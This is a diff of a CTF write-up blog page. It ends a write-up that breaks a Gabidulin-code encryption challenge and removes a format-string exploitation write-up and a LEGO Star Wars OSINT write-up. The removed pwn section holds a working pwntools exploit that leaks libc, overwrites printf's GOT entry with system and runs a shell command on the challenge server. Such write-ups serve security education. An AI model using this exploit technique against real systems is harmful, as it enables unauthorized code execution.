+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load public data (warp, bolt, shuttle, knot, pegs, N, K, enc_flag, nonce, tag)</span></span><br><span class="line"><span class="comment"># ... (data parsing omitted for brevity)</span></span><br><span class="line"></span><br><span class="line">F = GF(<span class="number">2</span>)</span><br><span class="line">Fqm = GF(<span class="number">2</span>^<span class="number">43</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Reconstruct the loom</span></span><br><span class="line">loom = Matrix(Fqm, K, N, <span class="keyword">lambda</span> j, i: qpow(pegs[i], j))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Remove shuttle disguise</span></span><br><span class="line">received = bolt * shuttle</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Build the modified generator matrix for decoding</span></span><br><span class="line"><span class="comment"># We need to decode received = s&#x27; * loom + error where s&#x27; = secret * knot</span></span><br><span class="line"><span class="comment"># Gabidulin decode (using sage&#x27;s built-in decoder or custom implementation)</span></span><br><span class="line">C = codes.GabidulinCode(loom)</span><br><span class="line">decoder = C.decoder(<span class="string">&quot;GabidulinGao&quot;</span>)</span><br><span class="line">s_prime = decoder.decode_to_message(received)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Recover original secret</span></span><br><span class="line">knot_inv = knot^(-<span class="number">1</span>)</span><br><span class="line">secret = s_prime * knot_inv</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Derive key and decrypt</span></span><br><span class="line">key = sha256(secret.base_extend(F) <span class="keyword">if</span> <span class="built_in">hasattr</span>(secret, <span class="string">&#x27;base_extend&#x27;</span>) <span class="keyword">else</span> secret).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)</span><br><span class="line">flag = cipher.decrypt_and_verify(enc_flag, tag)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure>
+<p>A complete standalone implementation of the Gabidulin Gao decoder can
+also be written from scratch using the standard algorithm — the core
+operation is solving a linearized polynomial interpolation problem using
+the <span class="math inline">\(q\)</span>-polynomial Euclidean
+algorithm.</p>
+<h2 id="why-this-works">Why This Works</h2>
+<p>The fundamental trick is the <strong>rank structure
+mismatch</strong>. The error <code>frays</code> is low-rank over <span
+class="math inline">\(\mathbb{F}_2\)</span>, and <code>shuttle</code> is
+low-rank over <span class="math inline">\(\mathbb{F}_{2^{43}}\)</span>
+(its entries live in a 3-dimensional subspace). The product amplifies
+the rank, but only multiplicatively — and the original Gabidulin code
+parameters were chosen so that this amplified rank still falls within
+the unique decoding radius:</p>
+<p><span class="math display">\[5 \times 3 = 15 &lt; 16 =
+\left\lfloor\frac{40-8}{2}\right\rfloor\]</span></p>
+<p>Moreover, because <strong>all masking matrices are
+published</strong>, there is no secret hiding the code. The disguise is
+a form of <em>key-committing encryption</em> without the key being
+secret — anyone can peel it off. The true security would require keeping
+at least one of <span class="math inline">\(\mathsf{knot}\)</span>,
+<span class="math inline">\(\mathsf{shuttle}\)</span>, or the
+<code>pegs</code> private.</p>
+<h2 id="flag">Flag</h2>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMDCTF{l01dr34u_l4mbda3_brick5_th3_w34v3_but_th3_trapd00r_unsp00ls_1t}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1705,277 +2214,6 @@ grants access to the dashboard and reveals the flag.</p></li>
 </ol>
 <h3 id="flag">Flag</h3>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-brick-city-office-space/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-brick-city-office-space/" class="post-title-link" itemprop="url">UMass CTF 2026 - Brick City Office Space</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 18:08:35 / Modified: 19:24:05" itemprop="dateCreated datePublished" datetime="2026-04-13T18:08:35+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-brick-city-office-space/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-brick-city-office-space/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Help design the office space for Brick City's new skyscraper! read
-flag.txt for design specifications.</p>
-<p><code>nc brick-city-office-space.pwn.ctf.umasscybersec.org 45001</code></p>
-</blockquote>
-<h3 id="enumeration">Enumeration</h3>
-<p>The challenge provides a 32-bit x86 Linux binary with the following
-protections:</p>
-<ul>
-<li><strong>RELRO:</strong> No RELRO (GOT is writable)</li>
-<li><strong>Stack Canary:</strong> No Canary</li>
-<li><strong>NX:</strong> Enabled</li>
-<li><strong>PIE:</strong> Disabled (Loads at
-<code>0x08048000</code>)</li>
-</ul>
-<p>Decompiling the <code>vuln</code> function reveals a clear
-<strong>Format String Vulnerability</strong>:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = fgets(format, <span class="number">592</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">printf</span>(format); <span class="comment">// &lt;--- Vulnerable call</span></span><br></pre></td></tr></table></figure>
-<p>The program allows multiple "redesigns," enabling us to trigger the
-vulnerability several times in a single session. By sending
-<code>AAAA %p %p %p %p</code>, we confirm the format string offset is
-<strong>4</strong>.</p>
-<h3 id="exploitation-strategy">Exploitation Strategy</h3>
-<p>Since the binary has No RELRO and PIE is disabled, we can perform a
-standard GOT overwrite:</p>
-<ol type="1">
-<li><strong>Leak Libc:</strong> Use the first <code>printf</code> to
-leak a libc address from the GOT (e.g., <code>printf@GOT</code>).</li>
-<li><strong>Calculate Offsets:</strong> Determine the base address of
-libc and the absolute address of <code>system</code>.</li>
-<li><strong>GOT Overwrite:</strong> Trigger the "redesign" loop and send
-a payload to overwrite <code>printf@GOT</code> with the address of
-<code>system</code>.</li>
-<li><strong>Trigger Shell:</strong> Send the string
-<code>cat flag.txt</code> in the next iteration.
-<code>printf(format)</code> will execute
-<code>system("cat flag.txt")</code>.</li>
-</ol>
-<h3 id="solution">Solution</h3>
-<p>The following exploit uses <code>pwntools</code> to automate the
-process, carefully avoiding backticks (<code>`</code>) which the binary
-handles specially.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./BrickCityOfficeSpace&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;brick-city-office-space.pwn.ctf.umasscybersec.org&#x27;</span>, <span class="number">45001</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">4</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Leak libc</span></span><br><span class="line">payload = p32(printf_got) + <span class="string">b&quot;|%4$s|&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line">leaked_printf = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = leaked_printf - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Overwrite GOT</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;(y/n)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line"><span class="comment"># Avoid backticks (0x60) by adjusting the number of bytes written</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got: libc.symbols[<span class="string">&#x27;system&#x27;</span>]&#125;, numbwritten=<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Trigger system(&quot;cat flag.txt&quot;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;(y/n)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;BrickCityOfficeSpace&gt;&quot;</span>, <span class="string">b&quot;cat flag.txt&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-son-of-a-sith/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-son-of-a-sith/" class="post-title-link" itemprop="url">UMass CTF 2026 - Son of a Sith...</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 14:15:20 / Modified: 14:21:45" itemprop="dateCreated datePublished" datetime="2026-04-13T14:15:20+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-son-of-a-sith/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-son-of-a-sith/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Hopefully I can track down this red brick, because if there’s one
-thing I know, it’s that I hate sand. Flag format
-UMASS{What_The_Red_Brick_Does}, eg UMASS{Ground_Pound}</p>
-</blockquote>
-<h3 id="initial-analysis">Initial Analysis</h3>
-<p>The challenge description provides several key clues:</p>
-<ul>
-<li><strong>"Son of a Sith..."</strong>: A direct reference to Darth
-Vader/Anakin Skywalker.</li>
-<li><strong>"I hate sand"</strong>: A famous quote by Anakin Skywalker
-from <em>Star Wars: Episode II – Attack of the Clones</em>, strongly
-associating the location with the desert planet
-<strong>Tatooine</strong>.</li>
-<li><strong>"Red Brick"</strong>: A collectible item from the LEGO Star
-Wars video games used to unlock "Extras".</li>
-<li><strong>Visual Clues</strong>: The provided image shows a LEGO Darth
-Vader in a canyon environment (Jundland Wastes) with a floating Red
-Brick.</li>
-</ul>
-<h3 id="solution">Solution</h3>
-<h4 id="game-identification">1. Game Identification</h4>
-<p>The low-poly aesthetic and the physical presence of a "Red Brick"
-(rather than the "Datacards" used in the 2022 <em>Skywalker Saga</em>)
-point to the classic games developed by TT Games, specifically
-<strong><em>LEGO Star Wars: The Complete Saga</em></strong> or
-<strong><em>LEGO Star Wars II: The Original Trilogy</em></strong>.</p>
-<h4 id="location-level">2. Location &amp; Level</h4>
-<p>The quote "I hate sand" and the environment confirm the setting as
-Tatooine. Specifically, the visual matches <strong>Episode IV, Chapter
-2: "Through the Jundland Wastes"</strong>.</p>
-<h4 id="red-brick-function">3. Red Brick Function</h4>
-<p>In <em>LEGO Star Wars: The Complete Saga</em>, the Red Brick found in
-the "Through the Jundland Wastes" level is located in a hidden area
-accessible in Free Play mode. Collecting this brick unlocks a specific
-"Extra" in the Cantina.</p>
-<p>Researching the collectibles for this specific level reveals that the
-Red Brick unlocks the <strong>Fast Force</strong> ability, which speeds
-up the animation for Jedi and Sith characters using the Force on
-objects.</p>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{Fast_Force}</span></span>
 
       
     </div>
